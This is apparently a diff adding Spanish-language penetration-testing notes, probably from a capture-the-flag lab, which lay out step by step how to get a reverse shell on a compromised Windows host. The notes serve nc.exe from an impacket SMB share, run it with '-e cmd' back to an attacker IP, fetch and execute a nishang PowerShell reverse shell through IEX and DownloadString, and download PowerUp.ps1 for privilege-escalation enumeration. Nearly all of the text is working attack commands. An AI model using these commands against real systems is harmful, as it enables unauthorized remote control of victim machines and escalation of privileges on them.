@@ -1,0 +1,31 @@
+# Paso 1 Buscamos el binario de nc.exe y nos lo compiamos a nuestra carpeta actual para postearlo
+$ locate nc.exe 
+
+# Paso 2 Montarse un servidor SmbFolder con la herramienta impacket
+$ impacket-smbserver smbFolder $(pwd) ---> para que tire de la ruta actual en donde nos encontramos
+
+# Paso 3 Antes de ejecutarlo el comando de abajo nos ponemos a la escucha con una session de netcat
+$ nc -vlnp 443
+
+# Paso 4 desde el RCE de la maquina victima (webshell, etc .. )
+$ start /b \\10.10.15.123\smbFolder\nc.exe -e cmd 10.10.15.123 443
+
+Aqui ya obtendriamos una Reverse-Shell como dios manda.
+Pero y si queremos tener una Powershell ???
+
+Pues Facil, nos traemos el archivito PST.ps1 que tenemos en el la carpeta nishang
+y nos montamos un servidor con python3
+$ python3 -m http.server 8000
+[.. PST.ps1..]
+
+# Paso 5 conseguir una PS
+Nos ponemos a la escucha por otro puerto(el configurado al final en el archivto PST.ps1) con otra session de netcat
+nc -vlnp 444
+
+# Paso 6 peticion PS
+$ start /b C:\\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).donwladString('http://10.10.15.123/PST.ps1')
+
+# Invocar el Power-up.ps1 para enumeracion del sistema
+$ Invoke-WebRequest http://10.10.15.123:8000/PowerUp-ps1 -o PowerUp.ps1
+
+ 
